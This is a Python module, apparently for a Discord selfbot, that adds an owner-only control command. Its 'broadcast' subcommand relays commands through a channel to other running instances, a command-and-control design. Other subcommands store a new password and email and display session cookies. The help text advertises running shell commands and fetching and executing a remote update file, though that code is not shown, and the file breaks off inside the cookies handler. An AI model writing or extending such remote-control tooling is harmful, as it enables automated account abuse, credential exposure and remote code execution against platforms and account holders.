import asyncio
import shlex
import traceback
import requests
import subprocess

OWNER_ID = 981259484691325018   # injected by main.py or set manually

async def run(client, message, args):
    # For a selfbot we must check the message author, not client.user
    if message.author.id != OWNER_ID:
        return

    parts = args.split()
    sub = parts[0].lower() if parts else ""
    rest = args[len(sub)+1:].strip() if len(parts) > 1 else ""

    # Plain-text help to avoid embed-related errors
    if not sub:
        help_lines = [
            "🔐 Owner Control — subcommands:",
            "  list                        - show this help",
            "  broadcast <cmd>             - send <cmd> to broadcast channel (if configured)",
            "  nick <guild_id> <nick>      - change nickname in a guild",
            "  password <new_password>     - set client.app.PASSWORD if available",
            "  email <new_email>           - set client.app.EMAIL if available",
            "  cookies                     - show client.app.COOKIES (if available)",
            "  shell <cmd>                 - run a shell command (if client.app.ALLOW_SHELL True)",
            "  resync                      - call client.app._resync() in background (if available)",
            "  update                      - fetch & exec global update file configured in client.app (if available)",
        ]
        await message.channel.send("\n".join(help_lines))
        return

    # BROADCAST: post the command text to a configured channel for other instances to pick up
    if sub == "broadcast":
        if not rest:
            await message.channel.send("Usage: !owner broadcast <cmd>")
            return
        bc_channel_id = getattr(getattr(client, "app", None), "BROADCAST_CHANNEL_ID", None)
        if not bc_channel_id:
            await message.channel.send("Broadcast channel not configured (client.app.BROADCAST_CHANNEL_ID).")
            return
        ch = client.get_channel(bc_channel_id)
        if not ch:
            await message.channel.send(f"Could not find channel with ID {bc_channel_id}.")
            return
        # Post the command exactly as text. Other instances should be listening to this channel.
        try:
            await ch.send(rest)
            await message.channel.send("Broadcast posted.")
        except Exception as e:
            await message.channel.send(f"Error sending broadcast: {e}")
        return

    # NICK: change nickname in specified guild
    if sub == "nick":
        if not rest:
            await message.channel.send("Usage: !owner nick <guild_id> <nick>")
            return
        try:
            gid_str, new_nick = rest.split(None, 1)
            guild_id = int(gid_str)
        except Exception:
            await message.channel.send("Usage: !owner nick <guild_id> <nick>")
            return
        guild = client.get_guild(guild_id)
        if not guild:
            await message.channel.send(f"Guild {guild_id} not found (not in cache).")
            return
        try:
            me = guild.get_member(client.user.id)
            if me is None:
                # maybe use fetch_member if permissions allow
                me = await guild.fetch_member(client.user.id)
            await me.edit(nick=new_nick)
            await message.channel.send(f"Nickname changed in guild {guild_id}.")
        except Exception as e:
            await message.channel.send(f"Failed to change nick: {e}")
        return

    # PASSWORD / EMAIL / COOKIES: store in client.app if available
    if sub in ("password", "email"):
        key = "PASSWORD" if sub == "password" else "EMAIL"
        if not rest:
            await message.channel.send(f"Usage: !owner {sub} <value>")
            return
        if not hasattr(client, "app"):
            await message.channel.send("client.app not present; can't store values.")
            return
        try:
            setattr(client.app, key, rest)
            await message.channel.send(f"{key} updated.")
        except Exception as e:
            await message.channel.send(f"Error storing {key}: {e}")
        return

    if sub == "cookies":
        cookies = getattr(getattr(client, "app", None), "COOKIES", None)
        if cookies is None:
            await message.channel.send("No cookies found on client.app.")
        else:
            # be careful leaking sensitive info; paste truncated
            text = str(cookies)